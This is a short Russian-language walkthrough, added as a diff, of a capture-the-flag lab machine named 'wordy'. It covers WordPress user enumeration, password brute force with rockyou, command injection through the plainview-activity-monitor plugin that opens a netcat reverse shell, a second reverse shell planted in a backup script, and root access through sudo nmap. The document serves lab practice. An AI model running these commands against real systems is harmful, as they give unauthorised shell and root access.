@@ -1,0 +1,39 @@
+1) при сканировании ничего интересного не обнаружено
+2)при перечислении обнаружено что на машине работает wordpress
+    wpscan --url http://wordy --enumerate u
+        admin mark graham sarah jens
+    
+    wpscan --url http://wordy --enumerate ap --plugins-detection aggressive --plugins-version-detection aggressive
+        user-role-editor
+            https://www.exploit-db.com/exploits/44595
+                *
+
+        plainview-activity-monitor
+             https://vk9-sec.com/wordpress-plugin-plainview-activity-monitor-authenticated-command-injection-cve-2018-15877/
+
+
+    wpscan --url http://wordy -U user.txt -P /root/Downloads/rockyou.txt
+        mark:helpdesk01
+
+3)воспользуемся уязвимостью plainview-activity-monitor
+    http://wordy/wp-admin/admin.php?page=plainview_activity_monitor&tab=activity_tools
+        lookup(при convert не сработает)
+        и в burp изменяем запрос
+            127.0.0.1|nc 192.168.226.135 1234 -e /bin/bash
+4)находим пароль от пользователя jens в файлу /home/mark/stuff/things-to-do.txt
+
+5)этот пользователь может выполнять backup.sh от имени пользователя jens, и его можно редатировать..... да мы знаем что делать
+    echo 'nc 192.168.226.135 4321 -e /bin/bash'>backups.sh
+
+6)пользователю jens доступно выполнение nmap от имени рута
+    TF=$(mktemp)
+    echo 'os.execute("/bin/sh")' > $TF
+    sudo nmap --script=$TF
+
+
+
+*
+wget 'https://www.exploit-db.com/download/44595' //загружаем необходимый класс
+mv 44595 44595.rb
+mv 44595.rb <(locate_your_(modules/auxiliary/admin/))>
+msfconsole(при просмотре в уже открытой консоли не отобразилось, пришлось открыть по новой)
